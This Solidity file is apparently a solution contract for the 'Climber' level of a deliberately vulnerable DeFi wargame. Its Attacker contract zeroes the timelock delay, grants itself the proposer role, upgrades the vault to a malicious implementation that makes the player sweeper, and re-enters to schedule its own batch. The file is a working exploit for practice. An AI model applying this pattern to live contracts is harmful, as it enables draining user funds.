// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "../../src/climber/ClimberConstants.sol";


contract Attacker {

    ClimberTimelock timelock;
    ClimberVault vault;
    DamnValuableToken token;
    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    address player;
    address evil;
    constructor(ClimberTimelock _timelock, ClimberVault _vault, DamnValuableToken _token, address _player, address _evil) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        player = _player;
        evil = _evil;
    }

    function attack() external {
        uint256 num = 4;
        address[] memory targets = new address[](num);
        uint256[] memory values = new uint256[](num);
        bytes[] memory dataElements = new bytes[](num);
        bytes32 salt = 0;
        
        (targets[0], values[0], dataElements[0]) = (address(timelock), 0, 
        abi.encodeCall(timelock.updateDelay, (uint64(0))));
        (targets[1], values[1], dataElements[1]) = (address(timelock), 0, 
        abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this))));
        (targets[2], values[2], dataElements[2]) = (address(vault), 0, 
        abi.encodeCall(vault.upgradeToAndCall, (address(evil), abi.encodeWithSignature("setSweeper(address)", player))));
        (targets[3], values[3], dataElements[3]) = (address(this), 0, abi.encodeCall(this.attack, ()));
        timelock.schedule(targets, values, dataElements, salt);
    }

}